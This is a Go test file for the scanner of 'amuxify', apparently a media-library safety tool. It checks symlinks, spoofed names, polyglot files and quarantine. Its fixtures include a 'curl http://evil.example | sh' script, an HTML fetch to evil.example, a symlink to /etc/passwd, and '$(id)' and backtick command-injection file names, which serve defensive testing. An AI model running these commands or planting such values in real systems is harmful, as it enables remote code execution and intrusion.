package scan

import (
	"bytes"
	"context"
	"io/fs"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"sync"
	"syscall"
	"testing"
	"time"

	"github.com/amuxify/amuxify/internal/exec"
	"github.com/amuxify/amuxify/internal/fsutil"
	"github.com/amuxify/amuxify/internal/policy"
	"github.com/amuxify/amuxify/internal/probe"
	"github.com/amuxify/amuxify/internal/report"
	"github.com/amuxify/amuxify/internal/testutil"
	"github.com/amuxify/amuxify/internal/verify"
)

// ebml is a minimal Matroska header, enough for sniff to say "matroska".
const ebml = "\x1a\x45\xdf\xa3\x01\x00\x00\x00\x00\x00\x00\x1f\x42\x86\x81\x01\x42\x82\x88matroska"

func mustProfile(t *testing.T, name string) *policy.Profile {
	t.Helper()
	p, err := policy.Load(name)
	if err != nil {
		t.Fatalf("load profile %s: %v", name, err)
	}
	return p
}

// noTools points every tool override at a missing path so a test that must
// not depend on installed tools gets deterministic "not found" behaviour.
func noTools(t *testing.T) {
	t.Helper()
	missing := filepath.Join(t.TempDir(), "no-such-tool")
	for _, tool := range []string{exec.FFmpeg, exec.FFprobe, exec.MKVMerge, exec.MKVPropedit, exec.MKVExtract, exec.ExifTool, exec.ClamScan} {
		t.Setenv("AMUXIFY_"+strings.ToUpper(tool), missing)
	}
}

func newScanner(t *testing.T, p *policy.Profile, r *exec.Runner) *Scanner {
	t.Helper()
	if r == nil {
		r = &exec.Runner{Timeout: 2 * time.Minute}
	}
	return &Scanner{
		Runner:   r,
		Prober:   &probe.Prober{Runner: r, Timeout: 2 * time.Minute},
		Verifier: &verify.Verifier{Runner: r, Timeout: 2 * time.Minute},
		Profile:  p,
	}
}

func write(t *testing.T, path, content string, perm os.FileMode) string {
	t.Helper()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte(content), perm); err != nil {
		t.Fatal(err)
	}
	return path
}

func codes(fr report.FileResult) []string {
	var out []string
	for _, f := range fr.Findings {
		out = append(out, f.Code+"/"+f.Severity.String())
	}
	return out
}

func scanOne(t *testing.T, s *Scanner, path string) report.FileResult {
	t.Helper()
	res, err := s.ScanPath(context.Background(), path)
	if err != nil {
		t.Fatalf("ScanPath(%s): %v", path, err)
	}
	if len(res) != 1 {
		t.Fatalf("ScanPath(%s): %d results", path, len(res))
	}
	return res[0].File
}

func expect(t *testing.T, fr report.FileResult, verdict report.Severity, required ...string) {
	t.Helper()
	if fr.Verdict != verdict {
		t.Errorf("%s: verdict %s want %s (%v)", filepath.Base(fr.Path), fr.Verdict, verdict, codes(fr))
	}
	for _, c := range required {
		if !fr.Has(c) {
			t.Errorf("%s: missing %s (%v)", filepath.Base(fr.Path), c, codes(fr))
		}
	}
}

// Guarantee 3: a symlink is reported and never opened.
func TestSymlinkSkippedNotFollowed(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	write(t, filepath.Join(dir, "a.mkv"), "plain text, not a container\n", 0o644)
	if err := os.Symlink("a.mkv", filepath.Join(dir, "link.mkv")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	res, err := s.ScanPath(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(res) != 2 {
		t.Fatalf("got %d results, want 2", len(res))
	}
	var link report.FileResult
	for _, r := range res {
		if filepath.Base(r.File.Path) == "link.mkv" {
			link = r.File
		}
	}
	if link.Path == "" {
		t.Fatal("no result for link.mkv")
	}
	if len(link.Findings) != 1 || link.Findings[0].Code != CodeSymlink || link.Findings[0].Severity != report.Warn {
		t.Fatalf("link.mkv findings: %v", codes(link))
	}
	if link.Verdict != report.Warn {
		t.Fatalf("link.mkv verdict %s", link.Verdict)
	}
}

// A symlink that points outside the tree, at a directory or nowhere, is
// still only reported and never descended into or read.
func TestSymlinkVariantsNeverFollowed(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	outside := t.TempDir()
	write(t, filepath.Join(outside, "evil.url"), "[InternetShortcut]\nURL=http://x\n", 0o644)
	write(t, filepath.Join(outside, "secret.nfo"), "secret\n", 0o644)
	if err := os.Symlink(outside, filepath.Join(dir, "dirlink")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	if err := os.Symlink(filepath.Join(outside, "secret.nfo"), filepath.Join(dir, "abs.nfo")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(filepath.Join(dir, "missing"), filepath.Join(dir, "dangling.mkv")); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../../../../../../etc/passwd", filepath.Join(dir, "traverse.txt")); err != nil {
		t.Fatal(err)
	}
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	res, err := s.ScanPath(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	seen := map[string]report.FileResult{}
	for _, r := range res {
		rel, _ := filepath.Rel(dir, r.File.Path)
		seen[filepath.ToSlash(rel)] = r.File
	}
	for _, name := range []string{"dirlink", "abs.nfo", "dangling.mkv", "traverse.txt"} {
		fr, ok := seen[name]
		if !ok {
			t.Errorf("%s not reported", name)
			continue
		}
		if len(fr.Findings) != 1 || fr.Findings[0].Code != CodeSymlink {
			t.Errorf("%s: %v", name, codes(fr))
		}
	}
	for name := range seen {
		if strings.HasPrefix(name, "dirlink/") {
			t.Errorf("descended into a symlinked directory: %s", name)
		}
	}
	if len(res) != 4 {
		t.Errorf("%d results, want 4", len(res))
	}
}

// toolsRequired mirrors testutil: AMUXIFY_REQUIRE_TOOLS set to 1, true or
// yes turns a skip over a tool or environment problem into a failure, so CI
// cannot go green on a test that never ran (review C18).
func toolsRequired() bool {
	v := strings.TrimSpace(os.Getenv("AMUXIFY_REQUIRE_TOOLS"))
	return v == "1" || strings.EqualFold(v, "true") || strings.EqualFold(v, "yes")
}

// skipOrFail skips the test, or fails it under AMUXIFY_REQUIRE_TOOLS.
func skipOrFail(t *testing.T, format string, args ...any) {
	t.Helper()
	if toolsRequired() {
		t.Fatalf("required (AMUXIFY_REQUIRE_TOOLS set): "+format, args...)
	}
	t.Skipf(format, args...)
}

func TestBidiNameBlocks(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	names := []string{
		"movie‮vkm.mkv",   // right-to-left override
		"notes​.nfo",      // zero-width space
		"⁦x.exe⁩",         // isolates
		"a\ufeffb.txt",    // BOM used as zero-width no-break space
		"clip‍.mp4",       // zero-width joiner
		"read‎me.url",     // left-to-right mark
		"s⁠ub.srt",        // word joiner
		"‭safe.mkv",       // left-to-right override
		"deep‮/inner.nfo", // in a directory name too
	}
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	for _, n := range names {
		p := filepath.Join(dir, n)
		if err := os.MkdirAll(filepath.Dir(p), 0o755); err != nil {
			t.Fatal(err)
		}
		body := ebml
		if strings.HasSuffix(n, ".nfo") || strings.HasSuffix(n, ".txt") || strings.HasSuffix(n, ".srt") {
			body = "plain text\n"
		}
		if err := os.WriteFile(p, []byte(body), 0o644); err != nil {
			skipOrFail(t, "filesystem refuses the name %q: %v", n, err)
		}
	}
	res, err := s.ScanPath(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(res) != len(names) {
		t.Fatalf("%d results, want %d", len(res), len(names))
	}
	for _, r := range res {
		if filepath.Base(r.File.Path) == "inner.nfo" {
			// The directory carries the bidi character, not the file name;
			// that is not extension spoofing and must not be a false BLOCK.
			expect(t, r.File, report.Pass, CodeSidecarOK)
			continue
		}
		expect(t, r.File, report.Block, CodeBidiName)
		if len(r.File.Findings) != 1 {
			t.Errorf("%q: scanning continued after BIDI_NAME: %v", r.File.Path, codes(r.File))
		}
	}
	// A name that only looks odd is fine.
	fr := scanOne(t, s, write(t, filepath.Join(t.TempDir(), "ünïcödé — 日本語.nfo"), "nfo\n", 0o644))
	expect(t, fr, report.Pass, CodeSidecarOK)
}

func TestEmptyFileBlocks(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	for _, n := range []string{"empty.mkv", "empty.nfo", "empty.url", "empty.xyz", "empty"} {
		fr := scanOne(t, s, write(t, filepath.Join(dir, n), "", 0o644))
		expect(t, fr, report.Block, CodeEmpty)
	}
}

func TestDoubleExtWarnsOnBlockedPenultimate(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	s := newScanner(t, mustProfile(t, "homelab"), nil)

	fr := scanOne(t, s, write(t, filepath.Join(dir, "x.exe.mkv"), ebml, 0o644))
	if !fr.Has(CodeDoubleExt) {
		t.Errorf("x.exe.mkv: no DOUBLE_EXT (%v)", codes(fr))
	}
	fr = scanOne(t, s, write(t, filepath.Join(dir, "x.tar.mkv"), ebml, 0o644))
	if fr.Has(CodeDoubleExt) {
		t.Errorf("x.tar.mkv: DOUBLE_EXT on a harmless penultimate extension (%v)", codes(fr))
	}
	// Under homelab an allowed sidecar with a blocked penultimate extension
	// is exactly WARN: the file itself passes, the name draws the warning.
	fr = scanOne(t, s, write(t, filepath.Join(dir, "x.exe.nfo"), "nfo\n", 0o644))
	expect(t, fr, report.Warn, CodeDoubleExt, CodeSidecarOK)
	fr = scanOne(t, s, write(t, filepath.Join(dir, "x.tar.nfo"), "nfo\n", 0o644))
	expect(t, fr, report.Pass, CodeSidecarOK)
	if fr.Has(CodeDoubleExt) {
		t.Errorf("x.tar.nfo: unexpected DOUBLE_EXT")
	}
	// Case does not matter, and neither does the number of dots.
	fr = scanOne(t, s, write(t, filepath.Join(dir, "X.EXE.NFO"), "nfo\n", 0o644))
	expect(t, fr, report.Warn, CodeDoubleExt)
	fr = scanOne(t, s, write(t, filepath.Join(dir, "a.b.c.scr.txt"), "t\n", 0o644))
	expect(t, fr, report.Warn, CodeDoubleExt)
	// The reverse spoof (media name, executable extension) is a blocked
	// sidecar, whatever the bytes inside.
	fr = scanOne(t, s, write(t, filepath.Join(dir, "movie.mkv.exe"), ebml, 0o644))
	expect(t, fr, report.Block, CodeSidecarBlocked)
	fr = scanOne(t, s, write(t, filepath.Join(dir, "movie.mkv.URL"), "[InternetShortcut]\n", 0o644))
	expect(t, fr, report.Block, CodeSidecarBlocked)
}

// Sidecar policy: the sidecar gate follows the profile lists.
func TestSidecarListsPerProfile(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	nfo := write(t, filepath.Join(dir, "a.nfo"), "release notes\n", 0o644)
	url := write(t, filepath.Join(dir, "a.url"), "[InternetShortcut]\nURL=http://x\n", 0o644)
	xyz := write(t, filepath.Join(dir, "a.xyz"), "whatever\n", 0o644)
	txt := write(t, filepath.Join(dir, "a.txt"), "text\n", 0o644)

	home := newScanner(t, mustProfile(t, "homelab"), nil)
	expect(t, scanOne(t, home, nfo), report.Pass, CodeSidecarOK)
	expect(t, scanOne(t, home, url), report.Block, CodeSidecarBlocked)
	expect(t, scanOne(t, home, xyz), report.Warn, CodeSidecarUnknown)
	expect(t, scanOne(t, home, txt), report.Pass, CodeSidecarOK)

	strict := newScanner(t, mustProfile(t, "strict"), nil)
	expect(t, scanOne(t, strict, nfo), report.Block, CodeSidecarBlocked)
	expect(t, scanOne(t, strict, url), report.Block, CodeSidecarBlocked)
	expect(t, scanOne(t, strict, xyz), report.Warn, CodeSidecarUnknown)
	expect(t, scanOne(t, strict, txt), report.Block, CodeSidecarBlocked)

	// An overlay can widen the allow list but a blocked extension stays
	// blocked, because the block list is checked first.
	custom, err := policy.Load(testutil.Profile(t, "[sidecars]\nallow=[\"xyz\",\"url\"]\n"))
	if err != nil {
		t.Fatal(err)
	}
	cs := newScanner(t, custom, nil)
	expect(t, scanOne(t, cs, xyz), report.Pass, CodeSidecarOK)
	expect(t, scanOne(t, cs, url), report.Block, CodeSidecarBlocked)
}

// Guarantee 9: BLOCK is final. No Scanner option lowers it.
func TestBlockIsNeverLowered(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	url := write(t, filepath.Join(dir, "a.url"), "[InternetShortcut]\nURL=http://x\n", 0o644)
	exe := write(t, filepath.Join(dir, "b.mkv"), "MZ\x90\x00\x03 not a movie", 0o644)
	poly := write(t, filepath.Join(dir, "c.mkv"), ebml+strings.Repeat("\x00", 4096)+"PK\x03\x04payload", 0o644)
	empty := write(t, filepath.Join(dir, "d.mp4"), "", 0o644)
	for _, name := range policy.Names() {
		p := mustProfile(t, name)
		for _, clam := range []bool{false, true} {
			for _, tier := range []string{"", "quick", "full", "none"} {
				s := newScanner(t, p, nil)
				s.ClamAV = clam
				s.VerifyTier = tier
				label := name + "/clamav=" + map[bool]string{false: "off", true: "on"}[clam] + "/tier=" + tier
				for path, code := range map[string]string{url: CodeSidecarBlocked, exe: CodeDangerous, poly: CodePolyglot, empty: CodeEmpty} {
					fr := scanOne(t, s, path)
					if fr.Verdict != report.Block || !fr.Has(code) {
						t.Errorf("%s %s: verdict %s %v", label, filepath.Base(path), fr.Verdict, codes(fr))
					}
				}
			}
		}
	}
	// Nor does a later PASS finding on the same file: Add never lowers.
	fr := scanOne(t, newScanner(t, mustProfile(t, "homelab"), nil), url)
	fr.Addf("LATER", report.Pass, "something benign")
	if fr.Verdict != report.Block {
		t.Fatalf("a PASS finding lowered BLOCK to %s", fr.Verdict)
	}
}

// Guarantee 2: temp files and Finder droppings are never scanned.
func TestWalkSkipsTempAndDSStore(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	write(t, filepath.Join(dir, ".amuxify-x.tmp"), "MZ\x90\x00", 0o644)
	write(t, filepath.Join(dir, ".amuxify-movie.mkv.tmp"), ebml, 0o644)
	write(t, filepath.Join(dir, ".DS_Store"), "\x00\x00\x00\x01Bud1", 0o644)
	write(t, filepath.Join(dir, "sub", ".DS_Store"), "x", 0o644)
	write(t, filepath.Join(dir, "sub", ".amuxify-y.tmp"), "x", 0o644)
	write(t, filepath.Join(dir, "sub", "real.nfo"), "nfo\n", 0o644)
	write(t, filepath.Join(dir, "ok.nfo"), "nfo\n", 0o644)
	// Names that only resemble the skipped ones are still scanned.
	write(t, filepath.Join(dir, "amuxify-x.tmp"), "x", 0o644)
	write(t, filepath.Join(dir, "DS_Store"), "x", 0o644)
	write(t, filepath.Join(dir, ".amuxify"), "x", 0o644)
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	res, err := s.ScanPath(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	var got []string
	for _, r := range res {
		rel, _ := filepath.Rel(dir, r.File.Path)
		got = append(got, filepath.ToSlash(rel))
	}
	sort.Strings(got)
	want := []string{".amuxify", "DS_Store", "amuxify-x.tmp", "ok.nfo", "sub/real.nfo"}
	if strings.Join(got, ",") != strings.Join(want, ",") {
		t.Fatalf("scanned %v, want %v", got, want)
	}
}

// Streaming: Progress runs for a file before the next file is opened.
func TestProgressFiresBeforeNextFile(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	write(t, filepath.Join(dir, "a.txt"), "a\n", 0o644)
	b := write(t, filepath.Join(dir, "b.txt"), "b\n", 0o644)
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	var order []string
	s.Progress = func(r Result) {
		order = append(order, filepath.Base(r.File.Path))
		if filepath.Base(r.File.Path) == "a.txt" {
			if err := os.Remove(b); err != nil {
				t.Errorf("remove b.txt: %v", err)
			}
		}
	}
	res, err := s.ScanPath(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	if len(res) != 2 || strings.Join(order, ",") != "a.txt,b.txt" {
		t.Fatalf("results %d, progress order %v", len(res), order)
	}
	expect(t, res[0].File, report.Pass, CodeSidecarOK)
	expect(t, res[1].File, report.Fail, CodeUnreadable)
}

// requireQuarantineFinding checks the frozen QUARANTINED finding. The file
// placement itself is asserted by the caller before this is called.
func requireQuarantineFinding(t *testing.T, fr report.FileResult, sev report.Severity, msg string) {
	t.Helper()
	for _, f := range fr.Findings {
		if f.Code != CodeQuarantined {
			continue
		}
		if f.Severity != sev || !strings.Contains(f.Message, msg) {
			t.Errorf("QUARANTINED finding: %+v, want %s %q", f, sev, msg)
		}
		return
	}
	t.Errorf("no QUARANTINED finding in %v, want %s %q", codes(fr), sev, msg)
}

// Guarantee 1: quarantine mirrors the tree and never overwrites.
func TestQuarantineMirrorsTree(t *testing.T) {
	noTools(t)
	root := t.TempDir()
	q := filepath.Join(t.TempDir(), "quarantine")
	src := write(t, filepath.Join(root, "sub", "x.url"), "[InternetShortcut]\nURL=http://x\n", 0o644)
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	s.Quarantine = q

	res, err := s.ScanPath(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	if len(res) != 1 {
		t.Fatalf("%d results", len(res))
	}
	fr := res[0].File
	expect(t, fr, report.Block, CodeSidecarBlocked)
	dest := filepath.Join(q, "sub", "x.url")
	if b, err := os.ReadFile(dest); err != nil || !strings.Contains(string(b), "InternetShortcut") {
		t.Fatalf("quarantined copy at %s: %v", dest, err)
	}
	if _, err := os.Lstat(src); err == nil {
		t.Fatal("source still present after quarantine")
	}
	// Nothing else was created under the quarantine root.
	var extra []string
	filepath.WalkDir(q, func(p string, d fs.DirEntry, err error) error {
		if err == nil && !d.IsDir() && p != dest {
			extra = append(extra, p)
		}
		return nil
	})
	if len(extra) > 0 {
		t.Fatalf("unexpected files in quarantine: %v", extra)
	}

	// Second run: the destination exists, so the move is refused and the
	// source stays where it is.
	write(t, src, "[InternetShortcut]\nURL=http://second\n", 0o644)
	res, err = s.ScanPath(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	fr2 := res[0].File
	if fr2.Verdict != report.Block {
		t.Fatalf("verdict %s", fr2.Verdict)
	}
	if _, err := os.Lstat(src); err != nil {
		t.Fatal("source removed although the quarantine slot was taken")
	}
	if b, _ := os.ReadFile(dest); !strings.Contains(string(b), "http://x") {
		t.Fatalf("first quarantined file overwritten: %q", b)
	}
	// The frozen findings: BLOCK "moved to <dest>" on success and WARN
	// "quarantine failed" when the slot was taken.
	requireQuarantineFinding(t, fr, report.Block, "moved to "+dest)
	requireQuarantineFinding(t, fr2, report.Warn, "quarantine failed")
}

// Whatever the tree looks like, quarantined files land under the quarantine
// root and nothing outside it is created.
func TestQuarantineNeverEscapesRoot(t *testing.T) {
	noTools(t)
	root := t.TempDir()
	qParent := t.TempDir()
	q := filepath.Join(qParent, "q")
	write(t, filepath.Join(root, "a.url"), "x\n", 0o644)
	write(t, filepath.Join(root, "..dots", "b.url"), "x\n", 0o644)
	write(t, filepath.Join(root, "sub", "..", "c.url"), "x\n", 0o644)
	write(t, filepath.Join(root, "sp ace", "d e.exe"), "x\n", 0o644)
	write(t, filepath.Join(root, "-rf", "e.sh"), "x\n", 0o644)
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	s.Quarantine = q
	res, err := s.ScanPath(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	for _, r := range res {
		if r.File.Verdict != report.Block {
			t.Errorf("%s: %v", r.File.Path, codes(r.File))
		}
		if _, err := os.Lstat(r.File.Path); err == nil {
			t.Errorf("%s: still in place", r.File.Path)
		}
	}
	var placed []string
	filepath.WalkDir(qParent, func(p string, d fs.DirEntry, err error) error {
		if err == nil && !d.IsDir() {
			placed = append(placed, p)
		}
		return nil
	})
	if len(placed) != len(res) {
		t.Fatalf("%d files quarantined for %d results: %v", len(placed), len(res), placed)
	}
	for _, p := range placed {
		rel, err := filepath.Rel(q, p)
		if err != nil || strings.HasPrefix(rel, "..") {
			t.Errorf("%s is outside the quarantine root", p)
		}
	}
	// The scan of a single file quarantines under its own base name.
	single := write(t, filepath.Join(t.TempDir(), "solo.url"), "x\n", 0o644)
	res, err = s.ScanPath(context.Background(), single)
	if err != nil {
		t.Fatal(err)
	}
	expect(t, res[0].File, report.Block, CodeSidecarBlocked)
	if _, err := os.Lstat(filepath.Join(q, "solo.url")); err != nil {
		t.Errorf("single file not quarantined under its base name: %v", err)
	}
	if _, err := os.Lstat(single); err == nil {
		t.Errorf("single file still in place")
	}
	for _, r := range res {
		requireQuarantineFinding(t, r.File, report.Block, "moved to ")
	}
}

// A symlink planted inside the quarantine tree must not redirect a
// quarantined file somewhere else.
func TestQuarantineRefusesSymlinkedSubdir(t *testing.T) {
	noTools(t)
	root := t.TempDir()
	q := filepath.Join(t.TempDir(), "q")
	elsewhere := t.TempDir()
	write(t, filepath.Join(root, "sub", "x.url"), "x\n", 0o644)
	if err := os.MkdirAll(q, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, filepath.Join(q, "sub")); err != nil {
		t.Skipf("symlinks unavailable: %v", err)
	}
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	s.Quarantine = q
	res, err := s.ScanPath(context.Background(), root)
	if err != nil {
		t.Fatal(err)
	}
	if res[0].File.Verdict != report.Block {
		t.Fatalf("verdict %s", res[0].File.Verdict)
	}
	if _, err := os.Lstat(filepath.Join(elsewhere, "x.url")); err == nil {
		t.Fatal("quarantine followed a symlinked directory inside the quarantine root and placed the file outside it")
	}
	// The source stays where it was, the symlink is untouched, and the
	// result says why the move was refused.
	if _, err := os.Lstat(filepath.Join(root, "sub", "x.url")); err != nil {
		t.Fatalf("source file gone: %v", err)
	}
	if fi, err := os.Lstat(filepath.Join(q, "sub")); err != nil || fi.Mode()&os.ModeSymlink == 0 {
		t.Fatalf("planted symlink was replaced or removed: %v", err)
	}
	requireQuarantineFinding(t, res[0].File, report.Warn, "quarantine failed")
	if res[0].File.Duration <= 0 {
		t.Error("Duration not recorded")
	}
}

// Every dangerous content type is caught regardless of the name it hides
// behind, and before any tool is consulted.
func TestDangerousContentUnderAnyName(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	bodies := map[string]string{
		"pe":     "MZ\x90\x00\x03\x00\x00\x00\x04",
		"elf":    "\x7fELF\x02\x01\x01\x00",
		"macho":  "\xcf\xfa\xed\xfe\x07\x00\x00\x01",
		"zip":    "PK\x03\x04\x14\x00\x00\x00",
		"gzip":   "\x1f\x8b\x08\x00",
		"pdf":    "%PDF-1.7\n%\xe2\xe3\xcf\xd3\n",
		"html":   "<!DOCTYPE html><html><script>fetch('http://evil.example')</script></html>",
		"script": "#!/bin/sh\ncurl http://evil.example | sh\n",
	}
	names := []string{"a.nfo", "a.srt", "a.txt", "a.jpg", "a.png", "a.mkv", "a.mp4", "a.mp3", "a.xyz", "a.NFO"}
	for kind, body := range bodies {
		for _, n := range names {
			fr := scanOne(t, s, write(t, filepath.Join(dir, kind+"-"+n), body, 0o644))
			if fr.Verdict != report.Block || !fr.Has(CodeDangerous) {
				t.Errorf("%s under %s: verdict %s %v", kind, n, fr.Verdict, codes(fr))
			}
		}
	}
	// Under a blocked extension the block list is reported instead, which
	// is still BLOCK.
	fr := scanOne(t, s, write(t, filepath.Join(dir, "x.url"), bodies["pe"], 0o644))
	expect(t, fr, report.Block, CodeSidecarBlocked)
}

// A container with an archive or executable appended is a polyglot and is
// blocked before ffprobe ever sees it.
func TestPolyglotAppendedPayloadBlocks(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	pad := strings.Repeat("\x00", 8192)
	cases := map[string]string{
		"zip.mkv":    ebml + pad + "PK\x03\x04\x14\x00payload",
		"zipend.mkv": ebml + pad + "PK\x05\x06\x00\x00",
		"rar.mkv":    ebml + pad + "Rar!\x1a\x07\x01\x00",
		"7z.mkv":     ebml + pad + "7z\xbc\xaf\x27\x1c",
		"elf.mkv":    ebml + pad + "\x7fELF\x02\x01",
		"pe.mkv":     ebml + "This program cannot be run in DOS mode" + pad,
		"big.mkv":    ebml + strings.Repeat("\x00", 2<<20) + "PK\x03\x04",
		"mp4.mp4":    "\x00\x00\x00\x18ftypmp42\x00\x00\x00\x00mp42isom" + pad + "PK\x03\x04",
	}
	for n, body := range cases {
		fr := scanOne(t, s, write(t, filepath.Join(dir, n), body, 0o644))
		if fr.Verdict != report.Block || !fr.Has(CodePolyglot) {
			t.Errorf("%s: verdict %s %v", n, fr.Verdict, codes(fr))
		}
		if fr.Has(CodeUnparseable) {
			t.Errorf("%s: probe ran on a polyglot", n)
		}
	}
}

// Executable permission bits follow the profile setting.
func TestExecPermPerProfile(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("no executable bit on Windows")
	}
	noTools(t)
	dir := t.TempDir()
	p := write(t, filepath.Join(dir, "a.txt"), "text\n", 0o755)
	expect(t, scanOne(t, newScanner(t, mustProfile(t, "homelab"), nil), p), report.Warn, CodeExecPerm, CodeSidecarOK)
	fr := scanOne(t, newScanner(t, mustProfile(t, "strict"), nil), p)
	if !fr.Has(CodeExecPerm) || fr.Verdict < report.Fail {
		t.Errorf("strict: %s %v", fr.Verdict, codes(fr))
	}
	ignore, err := policy.Load(testutil.Profile(t, "[safety]\nexec_permissions=\"ignore\"\n"))
	if err != nil {
		t.Fatal(err)
	}
	fr = scanOne(t, newScanner(t, ignore, nil), p)
	if fr.Has(CodeExecPerm) {
		t.Errorf("ignore: %v", codes(fr))
	}
	// Only the group or other bit set still counts.
	p2 := write(t, filepath.Join(dir, "b.txt"), "text\n", 0o601)
	expect(t, scanOne(t, newScanner(t, mustProfile(t, "homelab"), nil), p2), report.Warn, CodeExecPerm)
}

func TestUnreadableFileFails(t *testing.T) {
	if runtime.GOOS == "windows" || os.Geteuid() == 0 {
		t.Skip("permission bits are not enforced for this user")
	}
	noTools(t)
	dir := t.TempDir()
	p := write(t, filepath.Join(dir, "a.nfo"), "secret\n", 0o000)
	t.Cleanup(func() { _ = os.Chmod(p, 0o644) })
	fr := scanOne(t, newScanner(t, mustProfile(t, "homelab"), nil), p)
	expect(t, fr, report.Fail, CodeUnreadable)
	if _, err := os.Lstat(filepath.Join(dir, "missing")); err == nil {
		t.Fatal("test setup")
	}
	if _, err := newScanner(t, mustProfile(t, "homelab"), nil).ScanPath(context.Background(), filepath.Join(dir, "missing")); err == nil {
		t.Fatal("ScanPath on a missing root returned no error")
	}
}

// A sidecar whose bytes do not match its extension fails; bytes that are
// merely unknown (scene NFO box drawing) pass.
func TestSidecarContentMismatch(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	expect(t, scanOne(t, s, write(t, filepath.Join(dir, "a.srt"), "\x89PNG\r\n\x1a\n", 0o644)), report.Fail, CodeExtMismatch)
	expect(t, scanOne(t, s, write(t, filepath.Join(dir, "a.jpg"), "1\n00:00:01,000 --> 00:00:02,000\nHi\n", 0o644)), report.Fail, CodeExtMismatch)
	expect(t, scanOne(t, s, write(t, filepath.Join(dir, "a.nfo"), "\xdb\xdb\xdb\r\n\xb0\xb1\xb2 GROUP\r\n", 0o644)), report.Pass, CodeSidecarOK)
	expect(t, scanOne(t, s, write(t, filepath.Join(dir, "b.nfo"), "text\x00with nul\n", 0o644)), report.Pass, CodeSidecarOK)
	expect(t, scanOne(t, s, write(t, filepath.Join(dir, "a.mp4"), ebml, 0o644)), report.Fail, CodeExtMismatch)
	expect(t, scanOne(t, s, write(t, filepath.Join(dir, "b.mkv"), "just text\n", 0o644)), report.Fail, CodeExtMismatch)
}

// Hostile file names are scanned like any other and reported by the exact
// path they were found at.
func TestHostileNamesAreReportedVerbatim(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	names := []string{
		"-rf.nfo", "--help.nfo", "$(id).nfo", "`id`.nfo", "a;b.nfo", "a|b.nfo", "a b  c.nfo",
		"a\nb.nfo", "a\tb.nfo", "'quoted'.nfo", "\"dq\".nfo", "..nfo", "...nfo", ".hidden.nfo",
		strings.Repeat("x", 200) + ".nfo",
	}
	var created []string
	for _, n := range names {
		p := filepath.Join(dir, n)
		if err := os.WriteFile(p, []byte("nfo\n"), 0o644); err != nil {
			t.Logf("filesystem refuses %q: %v", n, err)
			continue
		}
		created = append(created, p)
	}
	if p := filepath.Join(dir, "bad\xff\xfeutf8.nfo"); os.WriteFile(p, []byte("nfo\n"), 0o644) == nil {
		created = append(created, p)
	}
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	res, err := s.ScanPath(context.Background(), dir)
	if err != nil {
		t.Fatal(err)
	}
	got := map[string]report.FileResult{}
	for _, r := range res {
		got[r.File.Path] = r.File
	}
	for _, p := range created {
		fr, ok := got[p]
		if !ok {
			t.Errorf("%q not reported", p)
			continue
		}
		expect(t, fr, report.Pass, CodeSidecarOK)
	}
	if len(res) != len(created) {
		t.Errorf("%d results for %d files", len(res), len(created))
	}
}

// A profile that requires ClamAV fails closed when clamscan is missing.
func TestClamAVRequiredFailsClosed(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	p := write(t, filepath.Join(dir, "a.mkv"), ebml, 0o644)
	fr := scanOne(t, newScanner(t, mustProfile(t, "strict"), nil), p)
	if fr.Verdict < report.Fail || !fr.Has(CodeClamMissing) {
		t.Fatalf("strict without clamscan: %s %v", fr.Verdict, codes(fr))
	}
	if fr.Has(CodeUnparseable) {
		t.Fatal("probe ran after the required scanner was reported missing")
	}
	// Optional mode carries on without it.
	s := newScanner(t, mustProfile(t, "homelab"), nil)
	s.ClamAV = true
	fr = scanOne(t, s, p)
	if fr.Has(CodeClamMissing) {
		t.Fatalf("optional clamscan reported as missing: %v", codes(fr))
	}
}

func TestHardlinkedSidecarReported(t *testing.T) {
	noTools(t)
	dir := t.TempDir()
	a := write(t, filepath.Join(dir, "a.nfo"), "nfo\n", 0o644)
	if err := os.Link(a, filepath.Join(dir, "b.nfo")); err != nil {
		t.Skipf("hard links unavailable: %v", err)
	}
	fr := scanOne(t, newScanner(t, mustProfile(t, "homelab"), nil), a)
	expect(t, fr, report.Pass, CodeHardlinked, CodeSidecarOK)
	if fr.Info["nlink"] != "2" {
